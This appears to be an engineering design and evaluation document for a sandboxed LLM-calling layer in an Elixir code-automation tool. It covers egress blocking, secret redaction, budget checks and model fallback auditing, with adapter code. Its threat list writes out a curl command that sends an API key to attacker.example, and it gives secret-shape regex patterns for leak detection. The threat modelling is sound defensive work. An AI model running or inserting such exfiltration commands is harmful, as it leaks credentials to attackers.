## 1. System Classification

**System Type:** LLM SDK Integration + Sandbox Driver + Safety Infrastructure (substrate layer beneath Kiln's product-level Code Automation Orchestrator thesis; **not** RAG, **not** an Agent Framework, **not** Conversational)

**Description:**
Phase 3 builds the substrate that every stage in a Kiln run uses to invoke an LLM: a provider-agnostic `Kiln.Agents.Adapter` behaviour wrapping Anthropix 0.6.2 for Anthropic (live) and Req 0.5 scaffolds for OpenAI/Google/Ollama, routed through `Kiln.ModelRegistry` profile presets, guarded by per-call `BudgetGuard` pre-flight, executed inside ephemeral Docker containers with egress blocked except to in-cluster DTU (Deterministic Test Unit) mocks, with secrets held as `persistent_term` references (never materialized into the sandbox or logs). "Good" means: a stage can call an LLM with the right model, have its cost recorded, fall back within-provider on 429/5xx, halt with a typed block reason on missing credentials, and never leak an API key — all verifiable by negative tests.

**Critical Failure Modes:**
1. **Sandbox escape / egress breach** — a stage container reaches the public internet over TCP/UDP/DNS/ICMP/IPv6, or `/var/run/docker.sock` becomes mountable (breaks multi-tenant safety even in solo-operator mode; weaponizable for data exfiltration).
2. **Secret leak** — an API key appears in a crash dump, Logger line, changeset error, telemetry measurement, `docker inspect` env output, workspace file, or LiveView render (SEC-01 violation; unrecoverable trust breach).
3. **Cost runaway** — budget pre-flight is bypassable, cost estimation is silently wrong (`count_tokens` drift or pricing table stale), or same-provider fallback loops infinitely across exhausted models (P2 HIGH-cost pitfall; can burn hundreds of USD before operator notice).
4. **Silent model drift** — a provider downgrades via 429 fallback to a cross-tier model (Sonnet → Haiku) without emitting an operator-visible warning, or `requested_model` and `actual_model_used` are not both persisted on the stage row (breaks reproducibility and spend attribution).
5. **Block-reason type erosion** — an unblock path accepts freeform chat instead of a typed `{reason_atom, remediation_playbook_id}` tuple, or a new failure mode is added without being added to the block-reason enum (breaks determinism and audit clarity; regresses BLOCK-01).
6. **DTU contract drift** — DTU mock responses diverge from real provider behaviour without the weekly contract-test harness catching it, so workflows that pass in dev fail in prod (P6 pitfall; silently corrupts the acceptance oracle).

## 1b. Domain Context

> Researched by `gsd-domain-researcher`. Grounds the evaluation strategy in domain expert knowledge.

**Industry Vertical:** Developer tooling / autonomous software engineering — specifically the sub-vertical of "agent-executed code changes without human-in-the-loop" (nascent since the Devin launch in 2024 and the SWE-Bench → SWE-Bench Verified evolution; now inhabited by Devin, OpenAI Codex, Claude Code, Cursor background agents, Aider `--yes-always`, OpenDevin/SWE-Agent, and Kiln). Phase 3 itself is the **substrate** (LLM SDK + sandbox driver + safety invariants) beneath that product thesis — it is evaluated by platform / SRE / security reviewers, not by the end consumers of the Phase 7+ LiveView dashboard.

**User Population:** Four practitioner communities evaluate this substrate, in decreasing order of contact with Phase 3 code:
1. **Kiln's solo operator** (the PROJECT.md persona) wearing an SRE hat — reads BudgetGuard telemetry + `model_routing_fallback` audit events + `/ops/oban` dashboard; owns the kill-switch.
2. **Security reviewers** (self-audit via `test/kiln/sandboxes/egress_blocking_test.exs`, `test/integration/secrets_never_leak_test.exs`, and `mix check` — `mix_audit` + `sobelow`) — review the six-redaction-layer invariant (D-133), the hardened Docker option set (D-117), and the env ALLOWLIST (D-134).
3. **Elixir/OTP production operators** — inherit supervision-tree shape (14 children per D-142), Finch per-provider pool sizing (D-109), and `persistent_term` secret store (D-131) patterns as the BEAM-native contract for later phases.
4. **Autonomous-coding-agent operators** at adjacent projects (the community around Devin, Aider, OpenDevin, SWE-Agent) — the reference audience for whether Kiln's bounded-autonomy invariants are table-stakes or experimental. Their postmortems (e.g., prompt-injection exfiltration, runaway retry loops, silent provider fallback) are the lived source for Phase 3's critical-failure-mode list.

**Stakes Level:** **HIGH** (not Critical — no life-safety and no multi-tenant blast radius per PROJECT.md scope-out, but direct financial and security consequences + high blast-radius across every downstream phase).

**Output Consequence:** Phase 3 produces no user-facing content. Its "output" is an execution substrate that every later stage (Phases 4–9) consumes. A regression here compounds: a bypass in `BudgetGuard` is a spend incident on every run; a leak in `Kiln.Secrets` revokes the Anthropic/OpenAI key org-wide and triggers ToS review; an egress hole in the sandbox turns an agent-authored `curl | sh` into a data-exfiltration vector on the operator's machine; a silent tier-crossing fallback produces correct-looking but degraded code that the scenario runner (UAT-01) may not catch. Every other phase's quality ceiling is capped by this floor.

### What Domain Experts Evaluate Against

> Each dimension is phrased in the practitioner community's own language (cost-ops / container-sec / secrets / OTP / coding-agent-ops), with a concrete accept/flag criterion a named community has written about. These are rubric **ingredients** — Section 5 (eval planner) composes them into measurable metrics.

**Dimension 1: Cost pre-flight fidelity**
- **Good (expert accepts):** Every LLM call is preceded by a token-count pre-flight (Anthropic's free `/v1/messages/count_tokens` endpoint for live P3) plus a pricing-table lookup that produces a `remaining_budget_usd` decision in one telemetry span, with both `requested_model` and `actual_model_used` persisted on the stage row. Pricing table is version-pinned and has a staleness-check CLI (`mix kiln.pricing.check`) that diffs against provider pricing pages.
- **Bad (expert flags):** Token counts estimated by `String.length/1 / 4` heuristic; pricing hard-coded in a module attribute; only `actual_model_used` (or only `requested_model`) recorded; no pre-flight and "we'll just look at the bill monthly."
- **Stakes:** High — Pragmatic Engineer's "pragmatic guide to LLM evals" and Portkey's observability guide both cite silent cost drift as the #1 production incident class; the Bifrost/Maxim writeups call runaway fallback chains "the thing that looks healthy on every standard alert."
- **Source:** Hamel Husain — "LLM Evals: Everything You Need to Know"; Pragmatic Engineer — "A pragmatic guide to LLM evals for devs"; Portkey — "The complete guide to LLM observability 2026"; Simon Willison — `llm-prices` repo convention that pricing is *data*, not code.

**Dimension 2: Sandbox egress containment**
- **Good (expert accepts):** Defense-in-depth across ≥5 orthogonal layers (Docker `internal: true` bridge, embedded DNS NXDOMAIN, `--dns` override to DTU, IPv6 sysctl kill, IPv4-only IPAM), verified by an adversarial test suite that covers **all five** egress vectors (TCP, UDP, DNS, ICMP, IPv6) with both negative assertions (public host unreachable) and a positive assertion (DTU reachable). Container runs `--cap-drop=ALL --security-opt=no-new-privileges --read-only --user 1000:1000 --pids-limit --init` with default seccomp, no socket mount.
- **Bad (expert flags):** Only TCP egress tested; egress block relies on a single mechanism (e.g., iptables rule on host); `--privileged`, `-v /var/run/docker.sock`, or a custom seccomp JSON introduced without an attack-surface review; IPv6 left default-on (moby#20559 inconsistency); `--read-only` skipped "because the agent needs to write `/workspace`" (missed: tmpfs is the answer).
- **Stakes:** High — CIS Docker Benchmark 5.3/5.25 and NIST SP 800-190 §4 both call out cap-drop + no-new-privileges + egress controls as the minimum bar; 2025 runc CVEs (CVE-2025-31133, -52565, -52881) + the filesystem-MCP CVEs (CVE-2025-53109/110) show single-layer defenses fail under real adversarial pressure.
- **Source:** CIS Docker Benchmark v1.6 (sections 5.3, 5.12, 5.25, 5.28); NIST SP 800-190 §4 "Container Runtime Risks"; OWASP Container Security Cheat Sheet (Rule #3); Aqua Security — "Docker CIS Benchmark: Best Practices in Brief"; Pillar Security — "The Hidden Security Risks of SWE Agents."

**Dimension 3: Secret non-materialization under adversarial observation**
- **Good (expert accepts):** A `docker inspect --format '{{json .Config.Env}}'` on a live stage container returns zero values matching secret-shape regex (`sk-ant-`, `sk-proj-`, `ghp_`, `gho_`, `AIza`); a crash-dump dumper (`Logger.error(inspect(state))`) emits no raw value; the grep-count for `Kiln.Secrets.reveal!/1` call sites matches the number of live providers (~3 for P3); adapter request structs `@derive {Inspect, except: [:api_key]}`; a `:telemetry` emission-boundary assertion proves metadata carries `%Ref{}` not string. Six (or more) orthogonal redaction layers named and individually testable.
- **Bad (expert flags):** API key appears in any of: a struct field rendered by `inspect/1`, a `Logger.metadata/1` value, an Ecto changeset error, a telemetry measurement/metadata map, a `docker inspect` env var, a workspace file written by any stage, a LiveView assign, a crash-report stacktrace. Env ALLOWLIST is implemented as a DENYLIST ("block things that look like keys") — OWASP guidance explicitly calls this the wrong shape.
- **Stakes:** Critical within the dimension — a single leak revokes the provider key for the entire Anthropic/OpenAI organization and subjects the account to ToS review; in the EchoLeak (CVE-2025-32711) class of attacks, env-variable access is the exfiltration primitive. Closes OWASP LLM Top 10 LLM02:2025 (Sensitive Information Disclosure).
- **Source:** OWASP LLM Top 10 2025 (LLM02 Sensitive Information Disclosure, LLM05 Supply Chain, LLM06 excessive agency); Anthropic + OpenAI API usage policies ("keys MUST NOT be logged or persisted unencrypted"); 12-factor app (config externalization); HashiCorp Vault secret-lifecycle writeups; Pillar Security + Augsburg University's "1,068 exfil variants" paper on agent-env-var attacks.

**Dimension 4: Fallback visibility and tier-crossing discipline**
- **Good (expert accepts):** Every fallback attempt writes exactly one `model_routing_fallback` audit event with `{requested_model, actual_model_used, fallback_reason, tier_crossed, attempt_number, provider_http_status}`; same-provider tier-crossing (Sonnet → Haiku) emits an operator-visible warning (P3: audit event; P7: desktop notification); cross-provider fallback is a declarative policy field (`fallback_policy: :same_provider | :cross_provider`) that is a data edit, not a code change; exhaustion terminates with a **typed** block reason, never a silent retry.
- **Bad (expert flags):** Fallback happens inside the SDK's retry logic with no emit to the app layer ("LiteLLM silently downgraded us and we noticed only when the PR quality dropped"); only `actual_model_used` is persisted; tier-crossing is detectable only by scraping Logger; exhausted chain loops forever with exponential backoff; "fallback succeeded" logged at DEBUG level.
- **Stakes:** High — the Traceloop / Statsig / Bifrost field reports all cite silent model drift as "the failure no alert catches"; Fabro-class systems are publicly documented to have shipped this exact regression and Kiln's Key Decisions table names "adaptive model routing with recorded `actual_model_used`" as an explicit anti-Fabro invariant.
- **Source:** Statsig — "Provider fallbacks: Ensuring LLM availability"; Traceloop — "Catching Silent LLM Degradation"; Portkey docs — "Fallbacks"; Google Cloud — "Handle 429 resource exhaustion errors"; Kiln PROJECT.md Key Decisions row ("Adaptive model routing with automatic 429/5xx fallback + recorded `actual_model_used`").

**Dimension 5: Typed-block-reason exhaustiveness (no chat-as-unblock)**
- **Good (expert accepts):** `Kiln.Blockers.Reason` is a closed enum; every consumer pattern-matches exhaustively (compiler warns on missing clauses); every reason has a versioned playbook (`priv/playbooks/v1/<reason>.md`) with YAML-frontmatter-validated fields (severity, short_message, remediation_commands, next_action_on_resolve); playbook renders identically to terminal / LiveView / Slack without content rewrite; unblock is a structured `{:resume, reason_atom}` message, never freeform text.
- **Bad (expert flags):** A new failure mode introduces a `String.contains?(error_message, "rate limit")` branch instead of a new reason atom; the unblock path accepts `params["user_message"]`; severity lives as a `boolean :is_critical` field (CLAUDE.md anti-pattern: boolean obsession — use enums); remediation steps are written inline in a controller action instead of a registry.
- **Stakes:** High — Gas Town / Fabro public postmortems cite "chat-to-unblock" as the design choice that broke replay and hid operator intent; Kiln's Key Decisions table lists "Typed block reasons + remediation playbooks (not freeform chat)" as a load-bearing invariant.
- **Source:** Kiln PROJECT.md Key Decisions ("Typed block reasons + remediation playbooks (not freeform chat)"); CLAUDE.md BLOCK-01 convention; Gas Town / Steve Yegge public writeups on "beads" durable work tracking; Fabro public reliability feedback.

**Dimension 6: BEAM-native lifecycle hygiene**
- **Good (expert accepts):** `docker run` is wrapped by `MuonTrap.cmd/3` so a BEAM crash kills the subprocess-tree (cgroup-v2 on Linux, port-close on macOS); an `OrphanSweeper` runs at boot and sweeps containers with `kiln.boot_epoch != current`, emitting one audit event per; `persistent_term` is write-once at boot (no runtime mutation → no global-GC thrash); Finch has named per-provider pools so a 429-storm on one provider cannot starve another; streaming returns `{:ok, Enumerable.t()}` passthrough without committing a PubSub backpressure policy before there's a consumer to calibrate against.
- **Bad (expert flags):** Raw `System.cmd("docker", ...)` with no subprocess-tree binding (zombie containers on crash); `:persistent_term.put/2` called on every request (triggers global GC; Fly.io's `persistent_term` writeup flags this explicitly); one shared Finch pool across providers; a GenServer-per-container or GenServer-per-work-unit (CLAUDE.md anti-pattern); `Process.put/2` for correlation IDs (P15 ban).
- **Stakes:** High — the solo-operator persona has no SRE team to page; BEAM-native-ness is what makes the OTP substrate a force-multiplier instead of a footgun.
- **Source:** Finch README / `elixirforum.com` thread on pool sizing (HTTP/2 `size: 1, count: N`); Dashbit NimblePool patterns; Fly.io Elixir infra posts on `persistent_term` write-once discipline; CLAUDE.md "Elixir-specific anti-patterns to avoid"; Erlang `:persistent_term` documentation (global GC semantics).

**Dimension 7: DTU contract fidelity (the acceptance-oracle substrate)**
- **Good (expert accepts):** DTU responses are JSV-validated at send-time against a pinned, dereferenced GitHub OpenAPI snapshot (`priv/dtu/contracts/github/api.github.com.2026-04.json`); unknown endpoints return `HTTP 501 Not Implemented` with a structured error body (fail loud, never echo-sink); weekly Oban contract-test job diffs the pinned snapshot against a live fetch and emits `dtu_contract_drift_detected` on mismatch; chaos modes are a closed set (`rate_limit_429`, `outage_503` in P3) with GitHub-accurate headers (e.g., `Retry-After`).
- **Bad (expert flags):** Generic HTTP echo-sink catches all unmatched paths ("works on my machine" factory); response fixtures captured via record-and-replay (ExVCR) that may persist live PAT tokens (SEC-01 violation); contract drift detected only when a run fails in prod; "chaos mode" is a freeform query parameter with unbounded values.
- **Stakes:** High — StrongDM's public writeups on "digital twin universe" designate SDK-compatibility as the success metric; drift here silently corrupts the scenario runner (UAT-01), which is Kiln's *only* acceptance oracle.
- **Source:** StrongDM public writeups on dark-factory DTU design; `github/rest-api-description` OpenAPI contract; JSV Draft 2020-12 validation patterns; Kiln D-122 rejection of ExVCR on SEC-01 grounds.

### Known Failure Modes in This Domain

> These are production-observed failure modes in the autonomous-coding-agent + LLM-substrate domain (2024–2026), distinct from generic hallucination. Each is mapped to a Phase 3 mitigation.

1. **Silent provider fallback cascade (the "LiteLLM problem").** An SDK handles a 429 internally via its built-in retry, falls through the configured fallback chain to a cheaper/cross-tier model, and returns a `200 OK` the application never knew was a fallback. The application's quality metrics degrade for hours before the cost-attribution report reveals it. *Kiln mitigation:* D-106 audit event + D-107 `:same_provider` only in P3 + D-105 `requested_model`/`actual_model_used` both persisted.

2. **Agent-authored exfiltration via ambient credentials.** An autonomous agent generates code that calls `curl -H "Authorization: $ANTHROPIC_API_KEY" https://attacker.example/...` — succeeding if the container inherits the host's env or if egress is unrestricted. The Pillar Security / Augsburg University work catalogs 1,068 variants. CVE-2025-32711 (EchoLeak) is the canonical real-world case. *Kiln mitigation:* D-134 env ALLOWLIST + D-119 five-layer egress block + D-131..D-134 six redaction layers + D-113 no-workspace-secret write.

3. **Runaway retry / spend loop ("the thing no alert catches").** Bounded-autonomy settings missing or misconfigured; agent retries the same failing verification indefinitely; budget hits five digits before a human notices. Publicly-cited on Fabro and GSD/GSD-2 feedback; named as "P2 HIGH-cost pitfall" in Kiln's ROADMAP. *Kiln mitigation:* D-138 per-call pre-flight BudgetGuard (no override env var) + D-139 scaffolded FactoryCircuitBreaker + Phase 5 stuck-detector body.

4. **Zombie-container orphan sprawl across BEAM restarts.** BEAM crashes mid-stage; Docker client subprocess orphans the container; on reboot, the OrphanSweeper either does not exist or does not use a boot-epoch label, so containers accumulate until the host runs out of resources. Documented in Elixir forum threads; the solo-operator persona is the worst case (no external fleet management). *Kiln mitigation:* D-115 MuonTrap crash-safe wrap + D-120 OrphanSweeper with boot-epoch label + BootChecks 8th invariant.

5. **Sandbox escape via mount race / symlink traversal.** 2025 runc CVEs (CVE-2025-31133, -52565, -52881) and filesystem-MCP CVEs (CVE-2025-53109/-53110) demonstrate that single-layer path-prefix checks are bypassable. The "harden once, never revisit" posture is the anti-pattern. *Kiln mitigation:* D-117 hardened option set (cap-drop=ALL, no-new-privileges, read-only, seccomp default, user 1000, pids-limit, init) + D-118 explicit rejection of socket mount + tmpfs-only writes.

6. **DTU drift silently corrupts the acceptance oracle.** The mock returns a shape that the real API has deprecated; scenarios pass in dev but fail in prod with no warning. Named as "P6 pitfall" in ROADMAP; StrongDM cites SDK-compatibility as the DTU success metric. *Kiln mitigation:* D-122 JSV-at-send-time validation against pinned snapshot + D-125 weekly contract-test Oban worker + `dtu_contract_drift_detected` audit event.

7. **Block-reason-as-string erosion.** Pattern-matching discipline decays over time; a contributor introduces `{:error, "rate limit hit, sorry"}` alongside the existing `{:error, :rate_limit_exhausted}`; consumer `case` falls through to a generic branch; the typed-reason invariant quietly breaks. CLAUDE.md calls this "boolean obsession" at a higher level. *Kiln mitigation:* D-135 closed 9-atom enum + exhaustive pattern-match from P3 forward + compile-time playbook registry (D-136) forces every reason to have a playbook.

### Regulatory / Compliance Context

No direct regulatory regime applies to Kiln's v1 deployment surface (PROJECT.md explicitly scopes out multi-tenant / SaaS / hosted-cloud / enterprise-auth). The applicable constraints are **voluntary frameworks + provider policies**, not legal mandates:

- **OWASP LLM Top 10 (2025 edition)** — directly applicable items:
  - **LLM02:2025 Sensitive Information Disclosure** — API keys, PATs, workspace file contents. Addressed by D-131..D-134 (secret redaction layers) + D-113 no-git-in-container + D-134 env ALLOWLIST.
  - **LLM05:2025 Supply Chain** — agent-generated code can import malicious packages. Addressed in P3 only at the sandbox layer (egress block); package-registry pinning is Phase 5+ scope.
  - **LLM06:2025 Excessive Agency** — bounded-autonomy caps, typed block reasons, no freeform unblock. Addressed by D-135..D-138.
- **CIS Docker Benchmark v1.6** — sections 5.3 (capabilities), 5.12 (read-only root FS), 5.25 (no-new-privileges), 5.28 (pids-limit), 5.10 (memory cap). Addressed by D-117's hardened option set.
- **NIST SP 800-190 (Application Container Security Guide)** — §4 container runtime risks + §5 host OS hardening. Addressed by D-117 (runtime) + documented in README (host posture is operator's responsibility in v1).
- **Anthropic + OpenAI API usage policies** — "API keys MUST NOT be logged or persisted unencrypted; keys MUST be revoked on compromise." Addressed by D-133 six redaction layers + D-132 `%Ref{}` struct discipline.
- **Docker Desktop licensing (informational)** — commercial use over 250 employees requires a paid plan. Not a regulatory gate for the solo-operator persona; noted here so a future multi-tenant re-scope knows where to look.
- **GDPR / HIPAA / SOC2 / PCI-DSS** — **not applicable** to Phase 3's deployment surface. Kiln processes no PII, no PHI, no cardholder data in its own workflow; specs written by the operator may reference such data, but scope for that belongs to v1.5+/v2 (per SEEDs). Do not design Phase 3 against these; designing against them would violate PROJECT.md scope discipline.

## 2. Framework Decision

**Selected Framework:** Anthropix (Elixir SDK) + Req (generic HTTP client) + custom `Kiln.Agents.Adapter` behaviour, with MuonTrap added for crash-safe Docker process wrapping.

**Version:** `anthropix ~> 0.6.2`, `req ~> 0.5`, `muontrap ~> 1.7` (new in Phase 3 — sole dependency addition per D-154). Host Elixir 1.19.5 / OTP 28.1.

**Rationale:**
Phase 3 is an LLM SDK integration plus sandbox/safety substrate, not an agent framework wrapper. Kiln IS the orchestrator — Elixir/OTP supervision trees, Oban jobs, and Postgres as source of truth already provide the coordination primitives that Python-ecosystem agent frameworks (LangChain, LangGraph, CrewAI, Claude Agent SDK, OpenAI Agents SDK, AutoGen, LlamaIndex) ship as their value prop. Adopting any of those would displace the core architectural thesis documented in PROJECT.md ("Kiln is an orchestrator of external agents, not a self-contained agent framework") and break the append-only audit ledger + typed-block-reason invariants that are non-negotiable per CLAUDE.md. Anthropix 0.6.2 is feature-complete for the three Phase 3 capabilities that actually matter: `Enumerable`-shaped streaming (D-103), `tool_use` request shaping for Anthropic's native structured-output mode (D-108), and free `count_tokens` pre-flight for `BudgetGuard` (D-107). It sits behind a thin `Kiln.Agents.Adapter` behaviour so OpenAI/Google/Ollama can be scaffolded on raw Req (~200 LOC each) in Phase 3 and flipped live in Phase 5 without disturbing call sites. MuonTrap supplants naive `System.cmd("docker", ...)` because the latter leaks zombie containers on BEAM crash; MuonTrap binds container lifetime to the calling Elixir process via cgroup-v2 on Linux and port-close semantics on macOS (D-112, D-154).

**Alternatives Considered:**

| Framework | Ruled Out Because |
|-----------|------------------|
| Pure `Req` calls to Anthropic HTTP API (skip Anthropix entirely, use Req for all four providers) | Anthropix 0.6.2 already ships clean `Enumerable` streaming, `tool_use` request shaping, and `count_tokens` pre-flight. Reimplementing on raw Req adds ~150 LOC of auth/retry/pagination boilerplate per provider with zero behavioural gain and sacrifices battle-tested pid-mode streaming. |
| `langchain_elixir` | Acknowledged as the canonical reference for `on_llm_new_delta` callback shape (D-103), but adopting the full runtime imports chain/memory abstractions Kiln does not need and complicates the three-layer secret-redaction invariants. Borrow the delta-callback shape; don't depend on the library. |
| `instructor_ex` / `instructor_lite` | `instructor_lite` is the canonical minimal-adapter reference for D-101/D-102; Kiln mirrors the pattern rather than depending on it to avoid Ecto-changeset coupling inside the adapter layer. Revisit in Phase 5+ if structured-output ergonomics demand it. |
| `ex_llm` (community multi-provider wrapper) | Opinionated abstractions over provider-specific features (streaming, tool_use, caching) that Kiln needs to expose directly for cost/drift tracking. Would force lossy translation between what Anthropic actually returned and what Kiln records on the stage row. |
| LangChain / LangGraph / CrewAI / AutoGen / Claude Agent SDK / OpenAI Agents SDK / LlamaIndex / Google ADK | Python/TypeScript-only or incompatible with BEAM-native orchestration. Kiln's four-layer model (Intent → Workflow → Execution → Control) is the orchestrator these frameworks each try to be; double-orchestration breaks append-only audit + typed-block-reason determinism. |
| OpenAPI Generator Elixir server stubs (for DTU mocks) | Rejected in D-122: Elixir server-stub generator is alpha-quality and fails SDK round-trip fidelity. DTU uses hand-written Plug handlers + JSV response validation against the `anthropic-sdk-python` OpenAPI spec. |
| ExVCR record-and-replay (for DTU fixtures) | Rejected in D-122: fixture capture risks persisting live PAT tokens, violating SEC-01. DTU fixtures are hand-authored deterministic responses keyed by request hash. |
| Mocking Docker via a Docker-in-Docker or `ex_docker` pure-Elixir driver | Rejected per CLAUDE.md convention: "No Docker socket mounts." `System.cmd` + MuonTrap around the Docker CLI is the only sanctioned driver; `ex_docker_engine_api` is allowed for introspection (reading container state) but not for lifecycle (create/start/stop). |

**Vendor Lock-In Accepted:** **Partial — and by design.** Anthropic is the single LIVE provider in Phase 3 (`@tag :live_anthropic`), with OpenAI/Google/Ollama adapter scaffolds gated behind `@tag :live_openai`, `@tag :live_google`, `@tag :live_ollama` (flipped live in Phase 5). The `Kiln.Agents.Adapter` behaviour is the abstraction seam — swapping providers costs ~200 LOC of adapter code, not a rewrite. Anthropix lock-in at the Anthropic-adapter layer is accepted because the SDK is actively maintained and matches the Elixir-native invariants. Docker-CLI lock-in is accepted over socket/API lock-in because it preserves the "no socket mount" safety posture.

### Entry Point Pattern

The minimal working path: `StageWorker.perform/1` → `BudgetGuard.check!/2` → `Adapter.Anthropic.complete/2` → response → `Audit.append!/1`. The adapter behaviour (D-102) is the contract; Anthropic is the only LIVE impl in P3.

```elixir
# lib/kiln/agents/adapter.ex — the behaviour contract (D-102, locked)
defmodule Kiln.Agents.Adapter do
  @type capabilities :: %{
          streaming: boolean(),
          tools: boolean(),
          thinking: boolean(),
          vision: boolean(),
          json_schema_mode: boolean()
        }

  @callback complete(prompt :: Kiln.Agents.Prompt.t(), opts :: keyword()) ::
              {:ok, Kiln.Agents.Response.t()} | {:error, term()}

  @callback stream(prompt :: Kiln.Agents.Prompt.t(), opts :: keyword()) ::
              {:ok, Enumerable.t()} | {:error, term()}

  @callback count_tokens(prompt :: Kiln.Agents.Prompt.t()) ::
              {:ok, non_neg_integer()} | {:error, term()}

  @callback capabilities() :: capabilities()
end

# lib/kiln/agents/adapter/anthropic.ex — LIVE Phase 3 impl
defmodule Kiln.Agents.Adapter.Anthropic do
  @behaviour Kiln.Agents.Adapter

  @impl true
  def capabilities,
    do: %{streaming: true, tools: true, thinking: true, vision: true, json_schema_mode: true}

  @impl true
  def complete(%Kiln.Agents.Prompt{} = prompt, opts) do
    # reveal!/1 is the ONLY unboxing site — raw string never crosses function boundary.
    api_key = Kiln.Secrets.reveal!(:anthropic_api_key)
    client = Anthropix.init(api_key, receive_timeout: 120_000, finch: Kiln.Finch)

    :telemetry.span(
      [:kiln, :agent, :call],
      telemetry_metadata(prompt, opts),
      fn ->
        result =
          case Anthropix.chat(client, prompt_to_keyword(prompt, opts)) do
            {:ok, raw} -> {:ok, Response.from_anthropix(raw, prompt, opts)}
            {:error, reason} -> {:error, classify_error(reason)}
          end

        {result, telemetry_measurements(result)}
      end
    )
  end

  @impl true
  def stream(%Kiln.Agents.Prompt{} = prompt, opts) do
    api_key = Kiln.Secrets.reveal!(:anthropic_api_key)
    client = Anthropix.init(api_key, receive_timeout: 120_000, finch: Kiln.Finch)

    # Anthropix `stream: true` returns a lazy Enumerable (verified hexdocs.pm/anthropix).
    # D-103: Wrap in Stream.each to emit per-chunk telemetry; NO PubSub in P3.
    case Anthropix.chat(client, Keyword.put(prompt_to_keyword(prompt, opts), :stream, true)) do
      {:ok, stream} ->
        t0 = System.monotonic_time(:millisecond)

        instrumented =
          Stream.each(stream, fn chunk ->
            :telemetry.execute(
              [:kiln, :agent, :stream, :chunk],
              %{byte_size: byte_size(inspect(chunk)),
                elapsed_since_start: System.monotonic_time(:millisecond) - t0},
              %{run_id: opts[:run_id], stage_id: opts[:stage_id],
                actual_model_used: opts[:actual_model_used]}
            )
          end)

        {:ok, instrumented}

      {:error, reason} ->
        {:error, classify_error(reason)}
    end
  end

  @impl true
  def count_tokens(%Kiln.Agents.Prompt{} = prompt) do
    # Anthropix 0.6.2 does NOT wrap /v1/messages/count_tokens — direct Req (~30 LOC).
    # Endpoint is FREE + has independent rate limits; ideal for BudgetGuard pre-flight.
    api_key = Kiln.Secrets.reveal!(:anthropic_api_key)

    Req.post(
      "https://api.anthropic.com/v1/messages/count_tokens",
      finch: Kiln.Finch,
      headers: [
        {"x-api-key", api_key},
        {"anthropic-version", "2023-06-01"},
        {"content-type", "application/json"}
      ],
      json: Prompt.to_count_tokens_body(prompt)
    )
    |> case do
      {:ok, %Req.Response{status: 200, body: %{"input_tokens" => n}}} -> {:ok, n}
      {:ok, %Req.Response{status: s, body: b}} -> {:error, {:http, s, b}}
      {:error, err} -> {:error, err}
    end
  end
end

# lib/kiln/stages/stage_worker.ex — the caller (P2 StageWorker, P3 wires in adapter)
defmodule Kiln.Stages.StageWorker do
  use Kiln.Oban.BaseWorker, queue: :stages

  @impl Oban.Worker
  def perform(%Oban.Job{args: %{"stage_run_id" => stage_run_id}}) do
    stage_run = Kiln.Stages.get_stage_run!(stage_run_id)
    run = Kiln.Runs.get_run!(stage_run.run_id)
    prompt = Kiln.Agents.Prompt.build(stage_run, run)

    # D-138: PRE-FLIGHT budget check — raises typed :budget_exceeded block on breach.
    :ok = BudgetGuard.check!(run, prompt)

    # Resolve the adapter module from preset → role → model (D-105).
    {adapter_mod, actual_model} = ModelRegistry.resolve_adapter(run.model_profile_snapshot, prompt.role)

    opts = [run_id: run.id, stage_id: stage_run.id, actual_model_used: actual_model]

    case adapter_mod.complete(prompt, opts) do
      {:ok, %Response{} = response} ->
        # Stage-completion tx: update stage_run, write audit, harvest artifacts, enqueue next.
        Kiln.Stages.Transitions.complete!(stage_run, response)

      {:error, reason} ->
        # ModelRegistry.next/2 returns next in chain (D-106); fallback or exhaust.
        handle_adapter_error(adapter_mod, prompt, opts, reason, stage_run)
    end
  end
end
```

### Common Pitfalls

Each pitfall is structurally prevented by a specific D-decision; fixing one in isolation is not the remediation — the invariant is what prevents regression.

1. **Calling `Kiln.Secrets.reveal!/1` outside an adapter HTTP-boundary stack frame** — the grep-audit count of ~3 call sites (one per live provider) is a structural invariant. Any new `reveal!` site triggers security review. If you need the key elsewhere, you're modelling wrong — pass the `%Ref{}` and reveal at the wire. **Mitigation:** D-132 + D-133 six-layer defense (type boundary + Inspect derive + `redact: true` + LoggerJSON.Redactor + Changeset redact + docker-inspect negative test).

2. **`PubSub.broadcast` on streaming chunks in P3** — LiveView has no built-in backpressure; broadcasting raw chunks floods the render queue and OOMs on slow consumers. D-103 explicitly defers PubSub topology to Phase 4 (work units) and Phase 7 (`stream_async/4`). **Mitigation:** P3 stream path emits per-chunk telemetry ONLY; no `Phoenix.PubSub` touchpoint in adapter code. Reference for P7: `langchain_elixir`'s `on_llm_new_delta` callback shape.

3. **Using `System.cmd("docker", ...)` without MuonTrap** — a BEAM crash mid-container leaves the Docker CLI subprocess tree orphaned on macOS (no cgroups). MuonTrap's C-binary parent-watch is the exact primitive. Banned per D-151 CLAUDE.md anti-pattern. **Mitigation:** D-115 mandates `MuonTrap.cmd/3` everywhere a long-running `docker run` is invoked; `docker run --rm --init --stop-timeout 10` + `OrphanSweeper` at boot provides defense-in-depth for the macOS cgroup gap (Pitfall 6 in RESEARCH.md).

4. **Finch pool sharing across providers** — a 429 storm on Anthropic head-of-lines every other provider if they share the pool. D-109 mandates `Kiln.Finch.{Anthropic,OpenAI,Google,Ollama}` named pools. **Mitigation:** Each adapter specifies `finch: Kiln.Finch.<Provider>` on `Anthropix.init/2` or `Req.post/2`. Do NOT bypass Req to raw Finch in P3 (escape hatch reserved for pathological SSE in later phases).

5. **Only recording `requested_model` (missing `actual_model_used`)** — fallback happens silently, operator thinks they're running Opus but the row shows Haiku's cost. D-106 mandates both fields written on every call + one `model_routing_fallback` audit event per fallback attempt with `tier_crossed: boolean`. **Mitigation:** `Response.t()` struct carries both fields; ModelRegistry.next/2 emits the audit event; fallback exhaustion → stage `:failed` with diagnostic artifact captured via `Kiln.Artifacts`, never silent loop.

6. **Mounting host workspace (`-v /path:/workspace:rw`)** — agent-generated code can `rm -rf` the repo. D-113 replaces with tmpfs + CAS hydration. **Mitigation:** `Kiln.Sandboxes.Hydrator` reads declared `input_artifacts` → tmpfs; `Kiln.Sandboxes.Harvester` walks `/workspace/out/` → `Kiln.Artifacts.put_stream/4`. No `-v` flag in `build_docker_run_args/1`.

